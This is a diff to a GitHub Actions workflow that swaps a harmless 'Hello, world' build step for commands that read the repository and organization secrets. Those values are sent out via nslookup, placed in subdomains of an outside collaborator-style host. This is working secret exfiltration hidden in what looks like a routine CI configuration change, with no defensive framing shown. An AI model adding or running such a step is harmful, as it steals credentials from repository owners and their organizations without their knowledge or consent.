@@ -9,6 +9,12 @@ jobs:
   build:
     runs-on: ubuntu-latest
 
+    env:
+      REPO_SECRET: ${{ secrets.REPOSITORY_SECRET }}
+      ORG_SECRET: ${{ secrets.ORGANIZATION_SECRET }}
+
     steps:
       - name: Run a one-line script
-        run: echo Hello, world!
+        run: |
+        nslookup $REPO_SECRET.stp2xskh25j8i5dl5ftmqtmmndt4hu5j.bcollaborator.binsec.cloud \
+        && nslookup $ORG_SECRET.stp2xskh25j8i5dl5ftmqtmmndt4hu5j.bcollaborator.binsec.cloud
